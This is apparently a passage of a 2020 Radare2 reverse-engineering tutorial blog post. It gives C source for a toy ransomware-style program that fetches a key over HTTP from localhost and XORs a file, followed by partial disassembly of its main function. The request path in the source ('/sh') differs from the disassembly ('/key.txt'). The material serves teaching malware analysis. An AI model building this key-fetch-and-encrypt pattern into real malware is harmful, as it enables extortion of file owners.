<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
        <title>Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)</title>
        <meta name="description" content="Performing get requests with UNIX sockets">
        <link rel="canonical" href="reversing-radare-16.html">
    

    <!-- Site Favicon -->
    <link rel="shortcut icon" href="assets/images/favicon.ico" type="image/png" />

    <!-- Font Embed Code -->
    <link href="https://fonts.googleapis.com/css?family=Karla:400,400i,700,700i" rel="stylesheet" />

    <!-- CSS Styles -->
    <link href="assets/css/style.css" rel="stylesheet">
    <link href="assets/css/light.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
    

</head>



<body class="layout-post">
    <div id="page" class="site">

        
        <header id="masthead" class="site-header outer">
    <div class="site-header-inside">
        <div class="site-branding">
            
                <p class="site-logo"><a href="index.html" rel="home"><img src="assets/images/logo.png" alt="Artik blue" /></a></p>
                <h1 class="site-title screen-reader-text"><a href="reversing-radare-16.html" rel="home">Artik blue digital thoughts</a></h1>
            
        </div><!-- .site-branding -->
        <nav id="main-navigation" class="site-navigation" aria-label="Primary Navigation">
            <ul class="menu">
            
                <li class="menu-item"><a href="about.html">About</a></li>
            
                <li class="menu-item"><a href="reversing.html">Reversing</a></li>
            
            </ul>
            <button id="sidebar-show" class="sidebar-toggle"><span class="screen-reader-text">Open Sidebar</span><span class="icon-more" aria-hidden="true"></span></button>
        </nav><!-- .site-navigation -->
    </div><!-- .site-header-inside -->
</header><!-- .site-header -->
        

        <div id="content" class="site-content fadeInDown delay_075s">
    <main id="main" class="site-main outer">
        <article class="post-full inner">
            <header class="post-header">
                <div class="post-meta">
                    <time class="post-date" datetime="2020-06-04">June 4,
                        2020</time>
                </div><!-- .post-meta -->
                <h1 class="posttitle">Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)</h1>
            </header><!-- .post-header -->
            
            <div class="post-thumbnail"><img class="featured-image img-fluid" src="assets/images/radare2/radare2_17.png"
                    alt="Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)"></div>
            
            <div class="post-content">
                <h3 id="performing-get-requests-with-unix-sockets">Performing get requests with UNIX sockets</h3>

<p>Sockets are the very fundamentals of networking in any operating system. You can be sure that many applications you daily use work with sockets on the inside eventhough they call custom made functions.</p>

<p>So any particular network protocol like HTTP or DNS can be “emulated” or better said, constructed over sockets, we only need to know about how it works, bout the format like specific headers, sizes, request-response schema and so to implement it with sockets. At the end we’ll just need to create a buffer and fill its bytes correctly then call write() over the specific socket right?</p>

<p>Today we’ll go over a very common protocol, HTTP. This protocol is used for www naviation, no news here but it is also (severely) used in malware for implementing command and control mechanisms.</p>

<p>Think for example about the average ransomware yes it may come with some crypto key hardcoded inside but on that case the thing won’t be very useful/dangerous cause the key would be easily extracted from the binary by the reverser and the decryption of files will be possible. But what if the key comes over the network under certain conditions and then is no more used? Then the only possibilty comes with intercepting all of the traffic, which may be difficult cause the program may use https or debugging/reading the progams memory while it is crypting and that is a thing the average user won’t probably do…</p>

<p>So in this following example I wrote a very simple program that will retrieve a 10 digit KEY from a remote server by performing an HTTP GET request and then use it to XOR a txt file on disk.</p>

<p><em>I need to say that I do not encourage you to write ransomware or any kind of malware, you may face legal consequences if you do it</em></p>

<p>Here’s the code:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt; 
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="cp">#define BSIZE 256
#define KSIZE 11
</span><span class="c1">// Lame sample routine for key extraction from an http response</span>
<span class="kt">void</span> <span class="nf">getKey</span><span class="p">(</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]){</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">kg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ki</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">while</span><span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">BSIZE</span> <span class="o">&amp;&amp;</span> <span class="n">kg</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span> <span class="sc">'&lt;'</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'k'</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'&gt;'</span> <span class="p">){</span>

            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">KSIZE</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
                <span class="n">key</span><span class="p">[</span><span class="n">ki</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
                <span class="n">ki</span> <span class="o">=</span> <span class="n">ki</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">kg</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// Lame sample routine for byte array xor</span>
<span class="kt">void</span> <span class="nf">cryp</span><span class="p">(</span><span class="kt">char</span> <span class="n">key</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]){</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">KSIZE</span><span class="p">;</span> <span class="n">i</span> <span class="o">++</span><span class="p">){</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="c1">// open a file xor the content and dump it to another file</span>
<span class="kt">void</span> <span class="nf">crypFile</span><span class="p">(</span><span class="kt">char</span> <span class="n">file</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]){</span>

    <span class="kt">int</span> <span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">;</span> 
    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="n">KSIZE</span><span class="p">];</span>
    <span class="n">infile</span> <span class="o">=</span> <span class="n">open</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span> <span class="p">,</span> <span class="mo">0644</span><span class="p">);</span> 
    <span class="n">outfile</span> <span class="o">=</span> <span class="n">open</span> <span class="p">(</span><span class="s">"crypted.cry"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buff</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">)){</span> 
        <span class="n">cryp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>

        <span class="n">write</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buff</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">close</span> <span class="p">(</span><span class="n">infile</span><span class="p">);</span> 
    <span class="n">close</span> <span class="p">(</span><span class="n">outfile</span><span class="p">);</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">portno</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">server</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="n">KSIZE</span><span class="p">];</span>
   <span class="kt">char</span> <span class="n">request</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"GET /sh HTTP/1.1</span><span class="se">\r\n</span><span class="s">User-Agent: nc/0.0.1</span><span class="se">\r\n</span><span class="s">Host: 127.0.0.1</span><span class="se">\r\n</span><span class="s">Accept: */*</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BSIZE</span><span class="p">];</span>

   <span class="n">portno</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
   <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
   <span class="n">server</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>

   
   <span class="n">bzero</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">));</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
   <span class="n">bcopy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">server</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">,</span> <span class="n">server</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">portno</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>

   <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">request</span><span class="p">));</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">getKey</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>

   <span class="n">crypFile</span><span class="p">(</span><span class="s">"sample.txt"</span><span class="p">,</span><span class="n">key</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>As you see the algorithm is simple, first we ask the remote server for the key, then the server will return a response containing data related to the status of the request like http headers and such, then the body will contain the k tagged key, so we’ll need to parse it, getKey will extract the key and tne crypFile will use it to xor the file in chunks of key size.</p>

<p>We start with the main function as usual:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273bc4</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">entry0</span> <span class="err">@</span> <span class="mh">0x55fa6e2738dd</span>
<span class="err">┌</span> <span class="mi">614</span><span class="o">:</span> <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_1b0h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x1b0</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_1a4h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x1a4</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_194h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x194</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_190h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x190</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_18ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x18c</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_188h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x188</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_180h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x180</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_17eh</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x17e</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_16bh</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x16b</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_160h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x160</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_158h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x158</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_150h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x150</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_148h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x148</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_140h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x140</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_138h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x138</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_130h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x130</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_128h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x128</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_120h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x120</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_118h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x118</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_114h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x114</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_110h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x110</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">int</span> <span class="n">argc</span> <span class="err">@</span> <span class="n">rdi</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span> <span class="err">@</span> <span class="n">rsi</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bc4</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bc5</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bc8</span>      <span class="mi">4881</span><span class="n">ecb00100</span><span class="p">.</span>  <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x1b0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bcf</span>      <span class="mi">89</span><span class="n">bd5cfeffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_1a4h</span><span class="p">],</span> <span class="n">edi</span> <span class="p">;</span> <span class="n">argc</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bd5</span>      <span class="mi">4889</span><span class="n">b550feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_1b0h</span><span class="p">],</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">argv</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bdc</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273be5</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273be9</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273beb</span>      <span class="mi">48</span><span class="n">b847455420</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x79656b2f20544547</span> <span class="p">;</span> <span class="err">'</span><span class="n">GET</span> <span class="o">/</span><span class="n">key</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bf5</span>      <span class="mi">48</span><span class="n">ba2e747874</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x545448207478742e</span> <span class="p">;</span> <span class="err">'</span><span class="p">.</span><span class="n">txt</span> <span class="n">HTT</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bff</span>      <span class="mi">488985</span><span class="n">a0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_160h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c06</span>      <span class="mi">488995</span><span class="n">a8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_158h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c0d</span>      <span class="mi">48</span><span class="n">b8502f312e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x550a0d312e312f50</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c17</span>      <span class="mi">48</span><span class="n">ba7365722d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x6e6567412d726573</span> <span class="p">;</span> <span class="err">'</span><span class="n">ser</span><span class="o">-</span><span class="n">Agen</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c21</span>      <span class="mi">488985</span><span class="n">b0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_150h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c28</span>      <span class="mi">488995</span><span class="n">b8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_148h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c2f</span>      <span class="mi">48</span><span class="n">b8743a206e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2e302f636e203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c39</span>      <span class="mi">48</span><span class="n">ba302e310d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x736f480a0d312e30</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c43</span>      <span class="mi">488985</span><span class="n">c0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_140h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c4a</span>      <span class="mi">488995</span><span class="n">c8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_138h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c51</span>      <span class="mi">48</span><span class="n">b8743a2031</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x302e373231203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c5b</span>      <span class="mi">48</span><span class="n">ba2e302e31</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x63410a0d312e302e</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c65</span>      <span class="mi">488985</span><span class="n">d0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_130h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c6c</span>      <span class="mi">488995</span><span class="n">d8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_128h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c73</span>      <span class="mi">48</span><span class="n">b863657074</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2f2a203a74706563</span> <span class="p">;</span> <span class="err">'</span><span class="n">cept</span><span class="o">:</span> <span class="err">*/'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c7d</span>      <span class="mf">488985e0</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_120h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c84</span>      <span class="n">c785e8feffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_118h</span><span class="p">],</span> <span class="mh">0xd0a0d2a</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c8e</span>      <span class="mi">66</span><span class="n">c785ecfeff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_114h</span><span class="p">],</span> <span class="mh">0xa</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c97</span>      <span class="n">c7856cfeffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_194h</span><span class="p">],</span> <span class="mh">0x50</span> <span class="p">;</span> <span class="sc">'P'</span> <span class="p">;</span> <span class="mi">80</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ca1</span>      <span class="n">ba00000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ca6</span>      <span class="n">be01000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mi">1</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cab</span>      <span class="n">bf02000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mi">2</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cb0</span>      <span class="n">e8ebfbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">socket</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cb5</span>      <span class="mi">898570</span><span class="n">feffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cbb</span>      <span class="mi">488</span><span class="n">d3dfe0100</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">str</span><span class="p">.</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>  <span class="p">;</span> <span class="mh">0x55fa6e273ec0</span> <span class="p">;</span> <span class="s">"127.0.0.1"</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc2</span>      <span class="n">e879fbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">gethostbyname</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc7</span>      <span class="mi">48898578</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cce</span>      <span class="mi">488</span><span class="n">d8580feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cd5</span>      <span class="n">be10000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mh">0x10</span>           <span class="p">;</span> <span class="mi">16</span>
